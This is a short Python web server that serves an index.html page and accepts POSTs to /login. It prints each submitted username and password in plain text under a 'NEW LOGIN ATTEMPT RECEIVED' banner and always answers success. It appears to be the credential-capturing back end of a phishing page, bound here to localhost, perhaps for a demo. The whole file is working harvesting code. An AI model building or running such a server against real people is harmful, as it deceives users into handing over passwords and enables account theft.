from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('index.html', 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data)
                username = data.get('username')
                password = data.get('password')

                print("\n" + "="*50)
                print("🔴 NEW LOGIN ATTEMPT RECEIVED")
                print("="*50)
                print(f"Username : {username}")
                print(f"Password : {password}")
                print("="*50 + "\n")

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'{"status": "success"}')
            except:
                self.send_response(400)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

print("Server running at http://localhost:8000")
HTTPServer(('localhost', 8000), Handler).serve_forever()